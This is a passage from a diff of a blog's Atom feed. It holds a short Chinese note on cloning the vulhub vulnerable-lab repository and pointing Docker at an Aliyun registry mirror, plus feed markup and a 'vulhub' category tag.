data-language="shell"><code class="language-shell">git clone http://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载慢，使用国内镜像</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim /etc/docker/daemon.json{"registry-mirrors":["https://6kx4zyno.mirror.aliyuncs.com"]}重启dockersystemctl daemon-reloadsystemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="vulhub" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/vulhub/"/>
     
   </entry>
   
